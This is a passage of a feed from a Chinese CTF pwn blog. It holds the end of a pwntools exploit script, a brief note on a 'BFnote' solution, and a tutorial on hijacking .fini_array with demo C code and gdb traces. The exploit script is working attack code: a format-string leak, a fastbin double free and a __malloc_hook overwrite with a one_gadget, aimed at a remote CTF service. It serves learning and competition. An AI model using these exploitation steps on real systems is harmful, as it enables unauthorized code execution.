class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">import sys</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line">if sys.argv[1]==&quot;l&quot;:</span><br><span class="line">p=process(&apos;./interested&apos;)</span><br><span class="line">libc=ELF(&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;)</span><br><span class="line">else:</span><br><span class="line">p=remote(&apos;123.56.85.29&apos;,3041)</span><br><span class="line">libc=ELF(&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;)</span><br><span class="line"></span><br><span class="line">e=ELF(&apos;./interested&apos;)</span><br><span class="line"></span><br><span class="line">def show(index):</span><br><span class="line">p.recvuntil(&apos;to do :&apos;)</span><br><span class="line">p.sendline(&apos;4&apos;)</span><br><span class="line">p.recvuntil(&apos;: &apos;)</span><br><span class="line">p.sendline(str(index))</span><br><span class="line"></span><br><span class="line">def new(lenght,cont,lenght2,cont2):</span><br><span class="line">p.recvuntil(&apos;to do :&apos;)</span><br><span class="line">p.sendline(&apos;1&apos;)</span><br><span class="line">p.recvuntil(&apos;: &apos;)</span><br><span class="line">p.sendline(str(lenght))</span><br><span class="line">p.recvuntil(&apos;: &apos;)</span><br><span class="line">p.sendline(cont)</span><br><span class="line">p.recvuntil(&apos;: &apos;)</span><br><span class="line">p.sendline(str(lenght2))</span><br><span class="line">p.recvuntil(&apos;: &apos;)</span><br><span class="line">p.sendline(cont2)</span><br><span class="line"></span><br><span class="line">def edit(index,cont,cont2):</span><br><span class="line">p.recvuntil(&apos;to do :&apos;)</span><br><span class="line">p.sendline(&apos;2&apos;)</span><br><span class="line">p.recvuntil(&apos;: &apos;)</span><br><span class="line">p.sendline(str(index))</span><br><span class="line">p.recvuntil(&apos;: &apos;)</span><br><span class="line">p.sendline(cont)</span><br><span class="line">p.recvuntil(&apos;: &apos;)</span><br><span class="line">p.sendline(cont2)</span><br><span class="line">def check():</span><br><span class="line">p.recvuntil(&apos;to do :&apos;)</span><br><span class="line">p.sendline(&apos;0&apos;)</span><br><span class="line">#info(p.recv(49))</span><br><span class="line">#leak=int(p.recv(12),16)</span><br><span class="line">p.recvline()</span><br><span class="line">leak=int(p.recvline()[31:43],16)</span><br><span class="line">print hex(leak)</span><br><span class="line">pause()</span><br><span class="line">return leak</span><br><span class="line">def delete(num):</span><br><span class="line">p.recvuntil(&apos;to do :&apos;)</span><br><span class="line">p.sendline(&apos;3&apos;)</span><br><span class="line">p.recvuntil(&apos;: &apos;)</span><br><span class="line">p.sendline(str(num))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(&quot;:&quot;)</span><br><span class="line">p.send(&apos;OreOOrereOOreO%17$p&apos;)</span><br><span class="line"></span><br><span class="line">libc_addr=check()-0x20830</span><br><span class="line"></span><br><span class="line">new(0x40,&apos;a&apos;*0x8,0x60,&apos;\x10&apos;*0x8) #1</span><br><span class="line">new(0x40,&apos;b&apos;*0x8,0x60,&apos;\x11&apos;*0x8) #2</span><br><span class="line">new(0x40,&apos;c&apos;*0x8,0x60,&apos;\x12&apos;*0x8) #3</span><br><span class="line"></span><br><span class="line">delete(1)</span><br><span class="line">delete(2)</span><br><span class="line">delete(1)</span><br><span class="line"></span><br><span class="line">new(0x60,p64(libc_addr+libc.sym[&quot;__malloc_hook&quot;]-0x23),0x60,&apos;\x14&apos;*4)</span><br><span class="line"></span><br><span class="line">new(0x60,&apos;\x16&apos;*4,0x60,&apos;\x1f&apos;*0x13+p64(libc_addr+0xf1147))</span><br><span class="line">#gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line">p.recvuntil(&apos;to do :&apos;)</span><br><span class="line">p.sendline(&apos;1&apos;)</span><br><span class="line">p.recvuntil(&apos;: &apos;)</span><br><span class="line">p.sendline(str(0x60))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="BFnote"><a href="#BFnote" class="headerlink" title="BFnote"></a>BFnote</h2><p>一个栈溢出，然后在bss上写值，申请任意大小的chunk，以chunk为基址进行任意偏移写</p><p>栈溢出被canary拦住了，预期解是通过申请很大的chunk，会mmap到libc附近地址，接着通过偏移改写TLS中的canary，接着就是常规ROP的操作了，可以ret2dlresolve，也可以爆破1/4096直接改写got表为system，调用即可。还看到了另一位师傅的wp，使用mprotect改bss可执行，写入shellcode就行了</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;force&quot;&gt;&lt;a href=&quot;#force&quot; class=&quot;headerlink&quot; title=&quot;force&quot;&gt;&lt;/a&gt;force&lt;/h2&gt;&lt;p&gt;标准的house of force，先申请较大的内存页，可泄露出libc基址，&lt;br&gt;然后申请较小堆块，溢出修改to
      
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>.fini_array段劫持</title>
    <link href="https://nocbtm.github.io/2020/02/20/%C2%96-fini-array%E6%AE%B5%E5%8A%AB%E6%8C%81/"/>
    <id>https://nocbtm.github.io/2020/02/20/-fini-array段劫持/</id>
    <published>2020-02-20T08:47:00.000Z</published>
    <updated>2020-04-13T02:59:51.793Z</updated>
    
    <content type="html"><![CDATA[<p>参考链接:</p><p> <a href="https://www.lhyerror404.cn/2019/12/19/fini_array%e6%ae%b5%e5%8a%ab%e6%8c%81/" target="_blank" rel="noopener">https://www.lhyerror404.cn/2019/12/19/fini_array%e6%ae%b5%e5%8a%ab%e6%8c%81/</a></p><p><a href="https://r0co.top/passages/利用LD-PRELOAD-HOOK系统内置函数/" target="_blank" rel="noopener">https://r0co.top/passages/%E5%88%A9%E7%94%A8LD-PRELOAD-HOOK%E7%B3%BB%E7%BB%9F%E5%86%85%E7%BD%AE%E5%87%BD%E6%95%B0/</a></p><p><a href="https://www.freebuf.com/articles/web/192052.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/192052.html</a></p><p><a href="https://blog.csdn.net/chen_jianjian/article/details/80627693" target="_blank" rel="noopener">https://blog.csdn.net/chen_jianjian/article/details/80627693</a></p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>大多数可执行文件是通过链接 libc 来进行编译的，因此 gcc 会将 glibc 初始化代码放入编译好的可执行文件和共享库中。 .init_array和 .fini_array 节（早期版本被称为 .ctors和 .dtors ）中存放了指向初始化代码和终止代码的函数指针。 .init_array 函数指针会在 main() 函数调用之前触发。这就意味着，可以通过重写某个指向正确地址的指针来将控制流指向病毒或者寄生代码。 .fini_array 函数指针在 main() 函数执行完之后才被触发，在某些场景下这一点会非常有用。例如，特定的堆溢出漏洞（如曾经的 Once upon a free()）会允许攻击者在任意位置写4个字节，攻击者通常会使用一个指向 shellcode 地址的函数指针来重写.fini_array 函数指针。对于大多数病毒或者恶意软件作者来说， .init_array 函数指针是最常被攻击的目标，因为它通常可以使得寄生代码在程序的其他部分执行之前就能够先运行。</p><h2 id="Demo-1"><a href="#Demo-1" class="headerlink" title="Demo 1"></a>Demo 1</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">static void start(void) __attribute__ ((constructor));</span><br><span class="line">static void stop(void) __attribute__ ((destructor));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"start == %p\n"</span>, start);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"stop == %p\n"</span>, stop);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">start</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"hello world!\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">stop</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"goodbye world!\n"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>gcc为函数提供了几种类型的属性，其中两个是我们特别感兴趣的：构造函数(constructors)和析构函数(destructors)。程序员应当使用类似下面的方式来指定这些属性：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">static void start(void) __attribute__ ((constructor));</span><br><span class="line">static void stop(void) __attribute__ ((destructor));</span><br></pre></td></tr></table></figure><p>带有”构造函数”属性的函数将在main()函数之前被执行，而声明为”析构函数”属性的函数则将在<em>after</em> main()退出时执行。</p><p>程序运行结果如下：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">➜  fini_array gcc test.c -o test</span><br><span class="line">➜  fini_array ls</span><br><span class="line">test  test.c</span><br><span class="line">➜  fini_array ./test</span><br><span class="line">hello world!</span><br><span class="line">start == 0x4005a4</span><br><span class="line">stop == 0x4005b5</span><br><span class="line">goodbye world!</span><br></pre></td></tr></table></figure></p><p>下载我们试试 objdump -h ./test</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">➜  fini_array objdump -h ./test</span><br><span class="line">18 .init_array   00000010  0000000000600e00  0000000000600e00  00000e00  2**3</span><br><span class="line">                  CONTENTS, ALLOC, LOAD, DATA</span><br><span class="line">19 .fini_array   00000010  0000000000600e10  0000000000600e10  00000e10  2**3</span><br><span class="line">                  CONTENTS, ALLOC, LOAD, DATA</span><br></pre></td></tr></table></figure><p>可以看到.init_array的地址为 0x600e00 , .fini_array的地址为 0x600e10</p><p>在gdb中分别对这两个地址跟踪一下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/4xg 0x600e00</span><br><span class="line">0x600e00:0x00000000004005400x00000000004005a4</span><br><span class="line">0x600e10:0x00000000004005200x00000000004005b5</span><br></pre></td></tr></table></figure><p>分析一下结果<br>.init_array存的 0x400540是 frame_dummy函数地址(ida里面可查看) 0x4005a4很明显是自己定义的start函数的地址</p><p>.fini_array存的 0x400540是 __do_global_dtors_aux函数地址(ida里面可查看) 0x4005b5 很明显是定义的stop函数的地址</p><h2 id="Demo-2"><a href="#Demo-2" class="headerlink" title="Demo 2"></a>Demo 2</h2><p>我们再看一个例子,其实就是前面的test程序函数少了属性，我把它定义成静态函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">start</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">stop</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"start == %p\n"</span>, start);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"stop == %p\n"</span>, stop);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">start</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"hello world!\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">stop</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"goodbye world!\n"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>同样编译和运行：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">➜  fini_array gcc test2.c -o test</span><br><span class="line">➜  fini_array ./test</span><br><span class="line">start == 0x4005a4</span><br><span class="line">stop == 0x4005b5</span><br></pre></td></tr></table></figure><p>函数地址并没有变化，但是因为start/stop函数未设定析构与构造属性，所以没有在开始和结束时被调用。</p><p>我们试试 objdump -h ./test2</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">➜  fini_array objdump -h ./test2</span><br><span class="line">18 .init_array   00000008  0000000000600e10  0000000000600e10  00000e10  2**3</span><br><span class="line">                  CONTENTS, ALLOC, LOAD, DATA</span><br><span class="line">19 .fini_array   00000008  0000000000600e18  0000000000600e18  00000e18  2**3</span><br><span class="line">                  CONTENTS, ALLOC, LOAD, DATA</span><br></pre></td></tr></table></figure><p>可以看到.init_array的地址为 0x600e10 , .fini_array的地址为 0x600e18，和test程序有点偏差。</p><p>现在我用gdb跟踪一波，查看一下.fini_array</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/2xg 0x600e18</span><br><span class="line">0x600e18:    0x0000000000400530    0x0000000000000000</span><br></pre></td></tr></table></figure><p>明显0x0000000000400530后面的函数指针没有被填充 是0x0000000000000000，所以程序结束后不会执行stop函数</p><p>现在我们控制程序执行流程，怎么控制呢？我把.fini_array的函数指针0x0000000000400530覆盖成stop函数的地址</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; set &#123;int&#125;0x600e18=0x4005b5</span><br><span class="line">pwndbg&gt; x/2xg 0x600e18 </span><br><span class="line">0x600e18:    0x00000000004005b5    0x0000000000000000</span><br></pre></td></tr></table></figure><p>输入c继续执行程序</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; c</span><br><span class="line">Continuing.</span><br><span class="line">start == 0x4005a4</span><br><span class="line">stop == 0x4005b5</span><br><span class="line">goodbye world!</span><br><span class="line">[Inferior 1 (process 7442) exited normally]</span><br></pre></td></tr></table></figure><p>成功执行了stop函数，如果stop函数是一段onegadget或shellcode我们就可以直接拿下shell</p><h2 id="分析与总结"><a href="#分析与总结" class="headerlink" title="分析与总结"></a>分析与总结</h2><p>我们来关心一下，上面的stop在什么地方被调用。</p><p>栈回溯跟踪看一下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"> ► 0x4005b5 &lt;stop&gt;                 push   rbp</span><br><span class="line">   0x4005b6 &lt;stop+1&gt;               mov    rbp, rsp</span><br><span class="line">   0x4005b9 &lt;stop+4&gt;               mov    edi, 0x40067a</span><br><span class="line">   0x4005be &lt;stop+9&gt;               call   puts@plt &lt;0x400430&gt;</span><br><span class="line"> </span><br><span class="line">   0x4005c3 &lt;stop+14&gt;              nop    </span><br><span class="line">   0x4005c4 &lt;stop+15&gt;              pop    rbp</span><br><span class="line">   0x4005c5 &lt;stop+16&gt;              ret    </span><br><span class="line"> </span><br><span class="line">   0x4005c6                        nop    word ptr cs:[rax + rax]</span><br><span class="line">   0x4005d0 &lt;__libc_csu_init&gt;      push   r15</span><br><span class="line">   0x4005d2 &lt;__libc_csu_init+2&gt;    push   r14</span><br><span class="line">   0x4005d4 &lt;__libc_csu_init+4&gt;    mov    r15d, edi</span><br><span class="line">───────────────────────────────────────[ STACK ]───────────────────────────────────────</span><br><span class="line">00:0000│ rsp  0x7fffffffdc68 —▸ 0x7ffff7de7df7 (_dl_fini+823) ◂— test   r13d, r13d</span><br><span class="line">01:0008│ r14  0x7fffffffdc70 —▸ 0x7ffff7ffe168 ◂— 0x0</span><br><span class="line">02:0010│      0x7fffffffdc78 —▸ 0x7ffff7ffe700 —▸ 0x7ffff7ffa000 ◂— jg     0x7ffff7ffa047</span><br><span class="line">03:0018│      0x7fffffffdc80 —▸ 0x7ffff7fb5000 —▸ 0x7ffff7a0d000 ◂— jg     0x7ffff7a0d047</span><br><span class="line">04:0020│ r10  0x7fffffffdc88 —▸ 0x7ffff7ffd9d8 (_rtld_global+2456) —▸ 0x7ffff7dd7000 ◂— jg     0x7ffff7dd7047</span><br><span class="line">05:0028│      0x7fffffffdc90 —▸ 0x7fffffffdd60 —▸ 0x7fffffffde50 ◂— 0x1</span><br><span class="line">06:0030│      0x7fffffffdc98 —▸ 0x7ffff7de7b44 (_dl_fini+132) ◂— mov    ecx, dword ptr [r12]</span><br><span class="line">07:0038│      0x7fffffffdca0 —▸ 0x7fffffffdc70 —▸ 0x7ffff7ffe168 ◂— 0x0</span><br><span class="line">─────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────</span><br><span class="line"> ► f 0           4005b5 stop</span><br><span class="line">   f 1     7ffff7de7df7 _dl_fini+823</span><br><span class="line">   f 2     7ffff7a46ff8 __run_exit_handlers+232</span><br><span class="line">   f 3     7ffff7a47045</span><br><span class="line">   f 4     7ffff7a2d837 __libc_start_main+247</span><br><span class="line">Breakpoint *0x4005b5</span><br><span class="line">Breakpoint *0x4005B5</span><br></pre></td></tr></table></figure><p>看到返回地址在_dl_fini+823，所以可以得出结论，.fini_array区节的第一个函数指针在程序结束时，由_dl_fini函数调用，所以我们可加以利用。在未开启PIE的情况下，只需实现一个任意地址写，将.fini_array区节的第一个函数指针改写成后门地址或者one_gadgets，在程序结束时便能控制流程</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;参考链接:&lt;/p&gt;
&lt;p&gt; &lt;a href=&quot;https://www.lhyerror404.cn/2019/12/19/fini_array%e6%ae%b5%e5%8a%ab%e6%8c%81/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https
      
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
</feed>
